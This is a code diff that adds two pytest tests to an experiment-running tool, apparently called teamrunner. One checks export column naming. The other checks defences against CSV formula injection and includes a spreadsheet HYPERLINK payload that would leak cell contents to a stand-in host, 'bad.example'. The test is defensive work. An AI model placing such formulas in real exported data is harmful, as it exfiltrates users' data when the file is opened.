@@ -95,3 +95,39 @@ def test_rehearsals_are_never_exported(exp, tmp_path):
     run_experiment(exp, Console(False, io.StringIO()), rehearse=True)
     assert main(["experiment", str(exp), "--export", str(tmp_path / "out")]) == 0
     assert table(tmp_path / "out", "runs") == []
+
+
+def test_a_factor_may_have_a_built_in_column_s_name(tmp_path):
+    """Found in the 2026-11-16 review (E2): a factor called `round` made --export crash after the
+    runs were paid for. Each factor's column is now `factor_<name>`."""
+    from test_experiment_run import TEAM, Paid, go as run, write
+    from teamrunner.experiment_run import export_experiment
+    write(tmp_path / "review", TEAM)
+    front = ("name: exp\nbase: ../review\nfactors:\n  round:\n"
+             "    - label: early\n      change: {}\n"
+             "    - label: late\n      change: {alice.prompt: file:variants/alice.md}\n"
+             "  status:\n    - label: plain\n      change: {}\n"
+             "replications: 2\nseed: 7\nlimits: {max_concurrent: 2, max_cost_usd: 10}\n")
+    exp = write(tmp_path / "exp", {"experiment.md": f"---\n{front}---\n",
+                                   "variants/alice.md": "alice leads the review of {{code}}.\n"})
+    assert run(exp, model=Paid())[0] == 0
+    out = tmp_path / "out"
+    assert export_experiment(exp, out, Console(False, io.StringIO())) == 0
+    runs = table(out, "runs")
+    assert len(runs) == 4
+    assert list(runs[0])[:5] == ["run_id", "condition", "factor_round", "factor_status", "replicate"]
+    assert {(r["condition"], r["factor_round"], r["factor_status"]) for r in runs} == \
+        {("early+plain", "early", "plain"), ("late+plain", "late", "plain")}
+    assert {r["round"] for r in runs} == {"1", "2"} and all(r["status"] == "completed" for r in runs)
+
+
+def test_a_cell_excel_would_run_as_a_formula_is_written_as_text():
+    """Found in the 2026-11-16 review (S10): model text such as `=HYPERLINK(…)` reached the
+    CSV as it was, and Excel runs a cell starting with = + - @ as a formula (D158)."""
+    from teamrunner.export import _cell
+    for text in ['=HYPERLINK("https://bad.example/?"&A2,"details")', "+1", "- first point", "@SUM(A1)",
+                 "\tx", "\rx"]:
+        assert _cell(text) == "'" + text
+    assert _cell("plain words") == "plain words" and _cell("a = b") == "a = b"
+    assert _cell(-3) == -3 and _cell(-0.5) == "-0.5"  # numbers are numbers, not text
+    assert _cell(["=x"]) == '["=x"]'
